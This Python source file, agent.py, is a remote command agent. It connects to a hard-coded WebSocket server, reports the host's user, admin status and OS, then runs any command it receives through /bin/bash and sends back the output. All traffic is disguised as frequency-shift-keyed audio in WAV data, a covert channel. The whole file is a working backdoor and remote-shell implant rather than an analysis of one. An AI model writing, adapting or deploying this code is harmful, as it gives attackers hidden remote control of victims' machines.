# agent.py

import numpy as np
from scipy.io import wavfile
import asyncio
import websockets
import sys
import io
import getpass
import platform
import os
import subprocess
import ctypes
import argparse
from colorama import init as colorama_init, Fore, Style
from pyfiglet import Figlet
import math

# Initialize colorama
colorama_init(autoreset=True)

# ASCII Art Banner using pyfiglet
def print_banner():
    f = Figlet(font='slant')
    banner = f.renderText('WebSocket Agent')
    print(Fore.CYAN + banner)

# HEX-FSK Mapping for Map A (Server to Agent)
FREQ_MAP_A = {
    '0': 1000, '1': 1100, '2': 1200, '3': 1300,
    '4': 1400, '5': 1500, '6': 1600, '7': 1700,
    '8': 1800, '9': 1900, 'A': 2000, 'B': 2100,
    'C': 2200, 'D': 2300, 'E': 2400, 'F': 2500
}

# HEX-FSK Mapping for Map B (Agent to Server)
FREQ_MAP_B = {
    '0': 1050, '1': 1150, '2': 1250, '3': 1350,
    '4': 1450, '5': 1550, '6': 1650, '7': 1750,
    '8': 1850, '9': 1950, 'A': 2050, 'B': 2150,
    'C': 2250, 'D': 2350, 'E': 2450, 'F': 2550
}

# Packet structure specs
PREAMBLE = "AAAAAA"  # 3 bytes, represented as 6 hex characters
END_BIT = "0F"        # 1 byte, represented as 2 hex characters

# Maximum payload size per frame (in characters)
MAX_PAYLOAD_PER_FRAME = 500  # Adjust based on requirements

# Global Debug Flag
DEBUG = False

def log_debug(message):
    if DEBUG:
        print(Fore.CYAN + f"[DEBUG] {message}" + Style.RESET_ALL)

def log_info(message):
    print(Fore.GREEN + f"[INFO] {message}" + Style.RESET_ALL)

def log_error(message):
    print(Fore.RED + f"[ERROR] {message}" + Style.RESET_ALL)

def plaintext_to_hex(plaintext):
    """Convert plaintext to hexadecimal string."""
    return plaintext.encode('utf-8').hex().upper()

def hex_to_plaintext(hex_string):
    """Convert hexadecimal string back to plaintext."""
    return bytes.fromhex(hex_string).decode('utf-8')

def encode_with_frequency_map(hex_string, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Encode a hex string using a specific frequency map into an FSK signal."""
    signal = np.array([], dtype=np.float32)
    for char in hex_string:
        frequency = freq_map.get(char)
        if not frequency:
            log_debug(f"Invalid character in hex string: {char}")
            continue
        t = np.linspace(0, symbol_duration, int(sampling_rate * symbol_duration), endpoint=False)
        tone = np.sin(2 * np.pi * frequency * t).astype(np.float32)
        signal = np.concatenate([signal, tone])
    return signal

def decode_with_frequency_map(signal, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Decode an FSK signal using a specific frequency map into a hex string."""
    n_samples = int(sampling_rate * symbol_duration)
    reversed_freq_map = {v: k for k, v in freq_map.items()}  # Frequency to Hex mapping
    decoded_hex = ""
    for i in range(0, len(signal), n_samples):
        chunk = signal[i:i + n_samples]
        if len(chunk) < n_samples:
            log_debug(f"Incomplete chunk detected. Expected {n_samples} samples, got {len(chunk)}.")
            continue
        fft_spectrum = np.fft.fft(chunk)
        freqs = np.fft.fftfreq(len(chunk), 1 / sampling_rate)
        positive_freqs = freqs[:len(freqs)//2]
        magnitudes = np.abs(fft_spectrum[:len(freqs)//2])
        dominant_freq = positive_freqs[np.argmax(magnitudes)]
        # Find the closest frequency in the map
        closest_freq = min(freq_map.values(), key=lambda f: abs(f - dominant_freq))
        hex_char = reversed_freq_map.get(closest_freq)
        if hex_char:
            decoded_hex += hex_char
            log_debug(f"Dominant Frequency: {dominant_freq} Hz, Mapped to: {hex_char}")
        else:
            log_debug(f"No mapping found for frequency: {dominant_freq} Hz")
    return decoded_hex

def encode_packet(plaintext, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Encode plaintext into a full FSK packet and return WAV data."""
    hex_payload = plaintext_to_hex(plaintext)
    # Construct packet: PREAMBLE + HEX_PAYLOAD + END_BIT
    packet_hex = f"{PREAMBLE}{hex_payload}{END_BIT}"
    log_debug(f"Constructed Packet (Hex): {packet_hex}")
    # Encode packet as FSK signal
    fsk_signal = encode_with_frequency_map(packet_hex, freq_map, symbol_duration, sampling_rate)
    # Save FSK signal to an in-memory WAV file
    with io.BytesIO() as wav_buffer:
        wavfile.write(wav_buffer, sampling_rate, fsk_signal)
        wav_data = wav_buffer.getvalue()
    return wav_data

def decode_packet(wav_data, freq_map, symbol_duration=0.1, sampling_rate=22050):
    """Decode a WAV file containing an FSK signal into plaintext."""
    # Read WAV data from bytes
    with io.BytesIO(wav_buffer_io := wav_data) as wav_buffer_io:
        try:
            sr, signal = wavfile.read(wav_buffer_io)
        except Exception as e:
            raise ValueError(f"Failed to read WAV data: {e}")

    if sr != sampling_rate:
        raise ValueError(f"Sampling rate mismatch: Expected {sampling_rate}, got {sr}")

    # Ensure signal is mono
    if len(signal.shape) > 1:
        signal = signal[:,0]

    log_debug(f"Read WAV data: {len(signal)} samples at {sr} Hz")

    # Decode the packet
    decoded_hex = decode_with_frequency_map(signal, freq_map, symbol_duration, sampling_rate)

    # Debug: Print decoded hex
    log_debug(f"Decoded Hex: {decoded_hex}")

    # Extract packet components
    if len(decoded_hex) < len(PREAMBLE) + len(END_BIT):
        raise ValueError("Packet too short.")

    preamble = decoded_hex[:len(PREAMBLE)]
    hex_payload = decoded_hex[len(PREAMBLE):-len(END_BIT)]
    end_bit = decoded_hex[-len(END_BIT):]

    # Verify preamble and end bit
    if preamble != PREAMBLE:
        raise ValueError("Invalid preamble.")
    if end_bit != END_BIT:
        raise ValueError("Invalid end bit.")

    # Convert hex payload to plaintext
    plaintext = hex_to_plaintext(hex_payload)
    log_debug(f"Decoded Packet: Payload Hex -> {hex_payload}, Plaintext -> {plaintext}")
    return plaintext

def split_into_frames(data, max_payload):
    """Split data into frames with a maximum payload size."""
    total_length = len(data)
    total_frames = math.ceil(total_length / max_payload)
    frames = []
    for i in range(total_frames):
        start = i * max_payload
        end = start + max_payload
        frame_data = data[start:end]
        frames.append((i + 1, total_frames, frame_data))
    return frames

def reconstruct_data(frames):
    """Reconstruct data from frames sorted by sequence number."""
    # Sort frames based on sequence number
    frames_sorted = sorted(frames, key=lambda x: x[0])
    data = ''.join([frame[1] for frame in frames_sorted])  # Correct index
    return data

class AgentClient:
    def __init__(self, uri="ws://192.168.1.102:8765", freq_map=FREQ_MAP_B, sampling_rate=22050):
        self.uri = uri
        self.freq_map = freq_map
        self.sampling_rate = sampling_rate

    async def connect(self):
        try:
            async with websockets.connect(self.uri, max_size=10**8) as websocket:
                log_info(f"Connected to WebSocket server at {self.uri}")
                
                # Send system information upon connection
                system_info = self.get_basic_info()
                log_debug(f"System Information: {system_info}")
                
                # Encode system info using Map B
                wav_system_info = encode_packet(system_info, self.freq_map, sampling_rate=self.sampling_rate)
                
                # Send the WAV file as binary data
                await websocket.send(wav_system_info)
                log_info("Sent system information to server.")
                
                log_info("Listening for commands...")
                
                # To handle multiple messages, maintain a dict for incoming frames
                incoming_frames = {}

                async for message in websocket:
                    if isinstance(message, bytes):
                        log_debug(f"Received binary message of {len(message)} bytes.")
                        try:
                            # Decode the WAV file into plaintext command using Map A
                            command = decode_packet(message, FREQ_MAP_A, sampling_rate=self.sampling_rate)
                            log_debug(f"Decoded Command: {command}")
                            
                            # Check if the command is a frame
                            if command.startswith("FRAME"):
                                # Expected frame format: FRAME:<message_id>:<sequence_number>:<total_frames>:<data>
                                parts = command.split(':', 4)
                                if len(parts) != 5:
                                    log_error(f"Invalid frame format: {command}")
                                    continue
                                _, message_id, sequence, total_frames, frame_data = parts
                                if message_id not in incoming_frames:
                                    incoming_frames[message_id] = []
                                incoming_frames[message_id].append((int(sequence), frame_data))
                                log_debug(f"Received Frame {sequence}/{total_frames} for Message ID {message_id}")
                                
                                # Check if all frames are received
                                if len(incoming_frames[message_id]) == int(total_frames):
                                    # Reconstruct the complete command
                                    frames = incoming_frames[message_id]
                                    complete_hex_command = reconstruct_data(frames)
                                    log_debug(f"Reconstructed Hex Command: {complete_hex_command}")

                                    try:
                                        # Convert hex command to plaintext
                                        complete_command = hex_to_plaintext(complete_hex_command)
                                        log_info(f"Complete Command Received: {complete_command}")
                                    except ValueError as ve:
                                        log_error(f"Failed to decode hex command: {ve}")
                                        continue
                                    
                                    # Remove the stored frames
                                    del incoming_frames[message_id]
                                    
                                    # Execute the command
                                    response = self.execute_command(complete_command)
                                    log_debug(f"Executed Command. Response: {response}")
                                    
                                    # Send the response back in frames
                                    await self.send_response(websocket, response)
                            else:
                                # Handle non-framed commands if any
                                log_info(f"Received Command: {command}")
                                response = self.execute_command(command)
                                log_debug(f"Executed Command. Response: {response}")
                                # Send the response back
                                await self.send_response(websocket, response)
                        except Exception as e:
                            error_message = f"ERROR: {str(e)}"
                            # Encode error message into WAV data
                            wav_error = encode_packet(error_message, self.freq_map, sampling_rate=self.sampling_rate)
                            await websocket.send(wav_error)
                            log_error(f"Error processing command: {error_message}")
                    elif isinstance(message, str):
                        log_debug(f"Received unexpected text message: {message}")
                        continue
        except Exception as e:
            log_error(f"Connection error: {e}")

    def get_basic_info(self):
        """Gather basic system information."""
        info = {}
        
        # Default Shell
        if platform.system() in ['Linux', 'Darwin']:
            info['Default Shell'] = '/bin/bash'  # Explicitly set to /bin/bash
        elif platform.system() == 'Windows':
            info['Default Shell'] = os.environ.get('COMSPEC', 'Unknown')
        else:
            info['Default Shell'] = 'Unknown'
        
        # Current User
        user = getpass.getuser()
        info['User'] = user
        
        # Admin Status
        if platform.system() == 'Windows':
            info['Is Admin'] = self.is_user_admin_windows()
        else:
            info['Is Admin'] = self.is_user_admin_unix()
        
        # OS Details
        info['OS'] = platform.platform()
        
        # Format the info as a plaintext string
        info_str = "\n".join([f"{key}: {value}" for key, value in info.items()])
        return info_str

    def is_user_admin_unix(self):
        """Check if the current user has admin (root) privileges on Unix."""
        try:
            return os.geteuid() == 0
        except AttributeError:
            # os.geteuid() is not available on some platforms (e.g., Windows)
            return False

    def is_user_admin_windows(self):
        """Check if the current user has admin privileges on Windows."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def execute_command(self, command):
        """Execute a shell command using /bin/bash and return its output."""
        try:
            # Execute the command using /bin/bash
            result = subprocess.run(
                command,
                shell=True,
                executable='/bin/bash',  # Specify /bin/bash explicitly
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            return output.strip() if output else "Command executed with no output."
        except subprocess.TimeoutExpired:
            return "Command execution timed out."
        except Exception as e:
            return f"Command execution failed: {str(e)}"

    async def send_response(self, websocket, response):
        """Send response back to the server, splitting into frames if necessary."""
        try:
            # Convert response to hex
            hex_response = plaintext_to_hex(response)
            # Split into frames
            frames = split_into_frames(hex_response, MAX_PAYLOAD_PER_FRAME)
            message_id = f"{int(asyncio.get_event_loop().time())}"
            log_debug(f"Sending {len(frames)} frames for Message ID {message_id}")
            for frame_number, total_frames, frame_data in frames:
                # Frame format: FRAME:<message_id>:<sequence_number>:<total_frames>:<data>
                frame_message = f"FRAME:{message_id}:{frame_number}:{total_frames}:{frame_data}"
                wav_data = encode_packet(frame_message, self.freq_map, sampling_rate=self.sampling_rate)
                await websocket.send(wav_data)
                log_debug(f"Sent Frame {frame_number}/{total_frames} for Message ID {message_id}")
            log_info("Sent response to server.")
        except Exception as e:
            log_error(f"Failed to send response: {e}")

def parse_arguments():
    parser = argparse.ArgumentParser(description="WebSocket Agent with Debugging and Enhanced UI")
    parser.add_argument('--debug', action='store_true', help="Enable debug mode for verbose logging")
    return parser.parse_args()

if __name__ == "__main__":
    # Print Banner
    print_banner()

    # Parse command-line arguments
    args = parse_arguments()
    DEBUG = args.debug

    # Create and run the agent
    agent = AgentClient(uri="ws://192.168.1.102:8765")  # Replace with your server's IP if needed
    try:
        asyncio.run(agent.connect())
    except KeyboardInterrupt:
        log_info("Agent stopped manually.")
    except Exception as e:
        log_error(f"Agent encountered an error: {e}")
